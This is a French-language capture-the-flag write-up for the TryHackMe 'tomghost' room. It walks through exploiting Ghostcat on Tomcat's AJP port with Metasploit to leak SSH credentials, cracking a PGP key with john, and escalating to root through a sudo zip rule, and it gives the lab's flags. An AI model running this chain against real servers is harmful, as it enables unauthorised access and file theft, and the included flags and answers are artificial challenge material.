# tomghost #
## Task 1 Flags ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.212.226 tomghost.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ nmap -A tomghost.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 14:29 CEST
Nmap scan report for tomghost.thm (10.10.212.226)
Host is up (0.035s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

On faisant un scan avec nmap remarque que plusieurs services sont-là :  
-Le service SSH sur le port 22  
-Le service tcpwrapped sur le port 53  
-Le service ajp13 sur le port 8009  
-Le service http 8080  

Sur le service http, on remarque c'est Apache Tomcat 9.0.30 qui est installé.  

Un autre chose sur la page principale de l'exercise, il y un icone avec Ghostcat dessus.  
Donc je suppose que Ghostcat tourne sur le site.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfconsole -q

msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Ghostcat


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL

msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS tomghost.thm
RHOSTS => tomghost.thm
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.10.212.226
Status Code: 200
Accept-Ranges: bytes
ETag: W/"1261-1583902632000"
Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
Content-Type: application/xml
Content-Length: 1261
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

On trouve des identifiants :  
-skyfuck  
-8730281lkjlkjdqlksalks  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh skyfuck@tomghost.thm
The authenticity of host 'tomghost.thm (10.10.212.226)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'tomghost.thm,10.10.212.226' (ECDSA) to the list of known hosts.
skyfuck@tomghost.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

On trouve des donnés chiffrés.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ scp skyfuck@tomghost.thm:./* ./
skyfuck@tomghost.thm's password: 
credential.pgp                                                                                                                                                                                              100%  394    10.4KB/s   00:00    
tryhackme.asc                                                                                                                                                                                               100% 5144    85.1KB/s   00:00 

tim@kali:~/Bureau/tryhackme/write-up$ gpg2john tryhackme.asc > hash

File tryhackme.asc

tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2021-07-21 14:54) 14.28g/s 15314p/s 15314c/s 15314C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On crack le mot passe de la clef qui est ici : alexandru 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gpg --import tryhackme.asc 
gpg: clef 8F3DA3DEC6707170 : clef publique « tryhackme <stuxnet@tryhackme.com> » importée
gpg: clef 8F3DA3DEC6707170 : clef secrète importée
gpg: clef 8F3DA3DEC6707170 : « tryhackme <stuxnet@tryhackme.com> » n'est pas modifiée
gpg:       Quantité totale traitée : 2
gpg:                     importées : 1
gpg:                 non modifiées : 1
gpg:           clefs secrètes lues : 1
gpg:      clefs secrètes importées : 1

tim@kali:~/Bureau/tryhackme/write-up$ gpg --decrypt credential.pgp 
gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
            dans les préférences du destinataire
gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
      « tryhackme <stuxnet@tryhackme.com> »
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

``` 

On importe la clef puis on déchiffre l'identifiant. 
On trouve les identifiants ci-dessous :  
-merlin  
-asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j  

**Compromise this machine and obtain user.txt**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh merlin@tomghost.thm
merlin@tomghost.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
```

La réponse est : THM{GhostCat_1s_so_cr4sy}

**Escalate privileges and obtain root.txt**
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Ici on peut exécuter zip avec sudo.  

```bash
merlin@ubuntu:~$ sudo /usr/bin/zip reponse.zip /root/root.txt
  adding: root/root.txt (stored 0%)

merlin@ubuntu:~$ unzip reponse.zip
Archive:  reponse.zip
 extracting: root/root.txt   

merlin@ubuntu:~$ cat ./root/root.txt 
THM{Z1P_1S_FAKE}

```

Ici on compresse le fichier dans un endroit ou on pourra lire le fichier.   

La réponse est : THM{Z1P_1S_FAKE}    